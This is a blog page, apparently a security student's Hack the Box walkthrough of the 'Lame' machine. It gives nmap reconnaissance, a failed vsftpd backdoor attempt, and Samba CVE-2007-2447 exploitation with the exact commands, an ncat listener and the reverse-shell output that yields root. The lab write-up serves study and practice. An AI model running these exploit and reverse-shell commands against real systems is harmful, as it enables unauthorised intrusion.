@@ -1,0 +1,199 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="LogistyxCat, Blog of a security student.">
+
+        <link rel="alternate"  href="https://logistyxcat.github.io/feeds/all.atom.xml" type="application/atom+xml" title="LogistyxCat Full Atom Feed"/>
+
+        <title>Lame - Hack the Box // LogistyxCat // Blog of a security student.</title>
+
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="./theme/css/pure.css">
+    <link rel="stylesheet" href="./theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="./author/riley.html" title="See posts by Riley">
+                </a>
+                <h2 class="article-info">Riley</h2>
+                <small class="about-author"></small>
+                <h5>Published</h5>
+                <p>Thu 13 February 2020</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+    </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>Lame - Hack the Box</h1>
+                        <p class="post-meta">
+                            // under                                 <a class="post-category" href="./tag/ctf.html">ctf</a>
+                                <a class="post-category" href="./tag/hack-the-box.html">hack the box</a>
+                                <a class="post-category" href="./tag/oscp-prep.html">oscp prep</a>
+                        </p>
+                </header>
+            </section>
+            <h2>Description</h2>
+<p>Lame is one of the easiest boxes overall, with a Samba SMB server exploit to instant root and a red herring.</p>
+<p>Lame is assigned IP 10.10.10.3.</p>
+<h2>Reconnaissance</h2>
+<p>We begin by initiating an Nmap scan.</p>
+<h4>Nmap</h4>
+<div class="highlight"><pre><span></span><span class="c1"># nmap -sV -sC -oA nmap/Lame 10.10.10.3</span>
+
+Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.3
+Host is up <span class="o">(</span><span class="m">0</span>.085s latency<span class="o">)</span>.
+Not shown: <span class="m">996</span> filtered ports
+PORT    STATE SERVICE     VERSION
+<span class="m">21</span>/tcp  open  ftp         vsftpd <span class="m">2</span>.3.4
+<span class="p">|</span>_ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code <span class="m">230</span><span class="o">)</span>
+<span class="p">|</span> ftp-syst: 
+<span class="p">|</span>   STAT: 
+<span class="p">|</span> FTP server status:
+<span class="p">|</span>      Connected to <span class="m">10</span>.10.14.8
+<span class="p">|</span>      Logged in as ftp
+<span class="p">|</span>      TYPE: ASCII
+<span class="p">|</span>      No session bandwidth limit
+<span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
+<span class="p">|</span>      Control connection is plain text
+<span class="p">|</span>      Data connections will be plain text
+<span class="p">|</span>      vsFTPd <span class="m">2</span>.3.4 - secure, fast, stable
+<span class="p">|</span>_End of status
+<span class="m">22</span>/tcp  open  ssh         OpenSSH <span class="m">4</span>.7p1 Debian 8ubuntu1 <span class="o">(</span>protocol <span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">1024</span> <span class="m">60</span>:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span class="o">(</span>DSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">2048</span> <span class="m">56</span>:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="m">139</span>/tcp open  netbios-ssn Samba smbd <span class="m">3</span>.X - <span class="m">4</span>.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+<span class="m">445</span>/tcp open  netbios-ssn Samba smbd <span class="m">3</span>.X - <span class="m">4</span>.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+<span class="p">|</span>_ms-sql-info: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+<span class="p">|</span>_smb-os-discovery: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+<span class="p">|</span>_smb-security-mode: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+<span class="p">|</span>_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>
+</pre></div>
+
+
+<h2>VSFTP, The Red Herring</h2>
+<p>The first item to jump out is the <code>vsftpd 2.3.4</code> server.  This version of the software has a well known backdoor, <a href="https://www.exploit-db.com/exploits/17491">EDB-ID 17941</a>.  I located a public PoC, published by In2econd on <a href="https://github.com/In2econd/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py">GitHub</a>.</p>
+<p>The exploit triggers the backdoor, which waits on port 6200 for commands.</p>
+<h4>vsftpd_234_exploit.py</h4>
+<p><code>python3 ./vsftpd_234_exploit.py 10.10.10.3 21 whoami</code>
+<img alt="Exploit failed on connection to backdoor" src="images\ctf\htb\lame\vsftpd_exploit_failed.png"></p>
+<p>As you can see, the exploit did execute, but we could not connect to the backdoor port.  Either the software was patched, or there is a firewall blocking connections to miscellaneous ports.  Nmap reports that the port is filtered, so my guess is the latter.</p>
+<p><img alt="Filtered port means filtered progress" src="images\ctf\htb\lame\vsftpd_verify_backdoor_state.png"></p>
+<h2>Investigating Samba</h2>
+<p>Since vsftp isn't an option, the remaining attack paths are either SSH or the Samba server.  Cursory research indicates that this version of OpenSSH doesn't have any significant exploits, and Nmap unfortunately failed to identify the exact version of Samba currently running.  Other utilities such as enum4linux also fail to identify the service sersion.</p>
+<p>Metasploit has a module for this, <code>auxiliary/scanner/smb/smb_version</code>, that appearently does have some success in identifying the service.  I can also locate the version in a packet dump when using various utilities such as smbmap.  The commands I used are listed below.</p>
+<p>msfconsole: <code>msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS 10.10.10.3; exploit; exit'</code></p>
+<p>tcpdump:    <code>tcpdump -nn -s0 -X -i tun0 host 10.10.10.3 &amp;&amp; port 445</code></p>
+<p><img alt="Finally a service version!" src="images\ctf\htb\lame\smb_identifying_version.png"></p>
+<p>Unix Samba 3.0.20-Debian has a Remote Code Execution vulnerability assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2007-2447">CVE-2007-2447</a> that allows arbitrary execution of commands in the username field.</p>
+<p>Github user <em>amiriunix</em> made a <a href="https://github.com/amriunix/CVE-2007-2447">great Python PoC</a> for this vulnerability.  After downloading, one should only need to install the python2 module <code>pysmb</code> to make it functional.  This should be as simple as <code>sudo pip2 install pysmb</code>.</p>
+<p>The instructions on the command is executed as such as thi:</p>
+<div class="highlight"><pre><span></span><span class="gu">##</span> Usage:
+
+shell
+$ python usermap_script.py &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;
+
+  <span class="k">*</span> <span class="sb">`RHOST`</span> -- The target address
+  <span class="k">*</span> <span class="sb">`RPORT`</span> -- The target port (TCP : 139)
+  <span class="k">*</span> <span class="sb">`LHOST`</span> -- The listen address
+  <span class="k">*</span> <span class="sb">`LPORT`</span> -- The listen port
+</pre></div>
+
+
+<p>After executing, it should create a reverse shell back to our machine.  First, we create a listener using Ncat (or something similar):</p>
+<div class="highlight"><pre><span></span><span class="c1"># rlwrap ncat -nvlp 8080</span>
+Ncat: Version <span class="m">7</span>.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::8080
+Ncat: Listening on <span class="m">0</span>.0.0.0:8080
+</pre></div>
+
+
+<p>The command then should look like this:</p>
+<div class="highlight"><pre><span></span><span class="c1"># python ./usermap_script.py 10.10.10.3 139 10.10.14.33 8080</span>
+<span class="o">[</span>*<span class="o">]</span> CVE-2007-2447 - Samba usermap script
+<span class="o">[</span>+<span class="o">]</span> Connecting !
+<span class="o">[</span>+<span class="o">]</span> Payload was sent - check netcat !
+</pre></div>
+
+
+<p>Back in our Ncat terminal:</p>
+<div class="highlight"><pre><span></span>Ncat: Connection from <span class="m">10</span>.10.10.3.
+Ncat: Connection from <span class="m">10</span>.10.10.3:37042.
+whoami <span class="o">&amp;&amp;</span> hostname
+root
+lame
+</pre></div>
+
+
+<p>Excellent!  A root level reverse shell.  From this point, we can upgrade to a terminal with Python (this trick and more are discussed <a href="https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2">here</a>) and locate the 2 flags.</p>
+<div class="highlight"><pre><span></span>which python
+/usr/bin/python
+python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+root@lame:/# ls /home
+ls /home
+ftp  makis  service  user
+root@lame:/# ls -l /home/*/user.txt
+ls -l /home/*/user.txt
+-rw-r--r-- <span class="m">1</span> makis makis <span class="m">33</span> Mar <span class="m">14</span>  <span class="m">2017</span> /home/makis/user.txt
+</pre></div>
+
+
+<p>This concludes the Lame walkthrough.  Thanks for reading!</p>
+            <div class="hr"></div>
+            <a href="#" class="go-top">Go Top</a>
+<footer class="footer">
+    <p>&copy; LogistyxCat &ndash;
+        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
+        for <a href="http://blog.getpelican.com/">Pelican</a>
+    </p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+</body>
+</html>
